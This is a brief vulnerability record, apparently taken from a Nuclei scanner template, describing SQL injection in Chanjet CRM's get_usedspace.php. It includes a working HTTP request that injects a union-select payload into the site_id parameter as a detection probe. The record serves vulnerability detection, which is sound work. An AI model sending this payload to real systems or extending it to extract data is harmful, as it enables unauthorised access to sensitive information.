# Vulnerability: Chanjet CRM - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`chanjet-crm-sqli.yaml`)

## Description
SQL injection exists in the Chanjet CRM get_usedspace.php, and sensitive information can be obtained through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{num}}))
```

